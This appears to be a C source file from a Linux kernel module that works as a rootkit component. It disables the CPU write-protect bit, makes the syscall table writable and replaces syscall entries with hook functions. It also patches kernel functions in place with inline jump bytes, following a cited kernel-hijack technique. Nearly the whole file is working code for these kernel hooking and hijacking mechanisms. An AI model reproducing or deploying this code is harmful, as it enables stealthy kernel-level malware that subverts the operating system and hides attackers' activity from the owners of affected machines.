#include <linux/module.h>   // For modules
#include <linux/kernel.h>   // For KERN_INFO
#include <linux/init.h>     // For init macros
#include <linux/errno.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>

#include "common.h"
#include "messagesToUser.h"

#define WRITE_PROTECT_MASK 0x10000

void **syscallTable = (void **) SYSCALL_TABLE;
void (*pages_rw)(struct page *page, int numpages) = (void *) PAGES_RW;
void (*pages_ro)(struct page *page, int numpages) = (void *) PAGES_RO;

unsigned long original_rw_mask;

// cr0 is a control register in the x86 family of processors.
// Bit 16 of that register is WP - Write protect: Determines whether
// the CPU can write to pages marked read-only
struct page *enable_rw(void *ptr) {
   struct page *tempPage;

   original_rw_mask = read_cr0() & WRITE_PROTECT_MASK;
	write_cr0 (read_cr0() & (~ WRITE_PROTECT_MASK));
   tempPage = virt_to_page(ptr);
   pages_rw(tempPage, 1);

   return tempPage;
}

void revert_rw(struct page *page) {
   pages_ro(page, 1);
	write_cr0 (read_cr0() | original_rw_mask); //TODO: change this to restore the previous flags instead of assume what the flags will be
}

// Replace the syscall specified by syscallNumber with the function
// pointed to by hook.
// Returns the previous function installed at that syscallNumber
void *hookSyscall(unsigned int syscallNumber, void *hook) {
	void *previousSyscallInstalledInTheTable;

	if (hook == NULL) {
		printError("attempted to hook system call to a NULL location.\n");
		return NULL;
	} else {
		struct page *page = enable_rw(syscallTable);
		previousSyscallInstalledInTheTable = syscallTable[syscallNumber];
		syscallTable[syscallNumber] = hook;
		revert_rw(page);
	}

	return previousSyscallInstalledInTheTable;
}

/*
0. Write your replacement function
1. Figure out what to write and where the function is
2. Write it to the function, and remember the original bytes
3. When you call the original, write the original back first, then overwrite it


 */

// Method inspired by http://www.selfsecurity.org/technotes/silvio/kernel-hijack.txt
// Hijack the function pointed to by 'function' and replaces it with a jump to
// 'replacement'. Returns 
void getHijackBytes(void *hijackDestination, /* out */ char *bytes) {
	static char hijackBytesStub[NUM_HIJACK_BYTES] =
			"\xb8\x00\x00\x00\x00"  /* movl   $0,%eax */
			"\xff\xe0"              /* jmp    *%eax   */
			;
	strncpy(bytes, hijackBytesStub, NUM_HIJACK_BYTES);
	*(long *) &bytes[1] = (long) hijackDestination;
}

/*void writeHijackBytes(void *address, char *replacementBytes) {
   replaceBytes(address, replacementBytes, NULL) {
}*/

void writeHijackBytes(void *original, char *replacementBytes, /* out */ char *previousBytes) {
   int i;
   char *address;
   struct page *page;

   address = (char *) original;

   for (i = 0; i < NUM_HIJACK_BYTES; i++) {
      if (previousBytes != NULL) {
         *previousBytes = *address;
         previousBytes++;
      }
      page = enable_rw(address);
      *address = *replacementBytes;
      revert_rw(page);
      address++;
      replacementBytes++;
   }
}

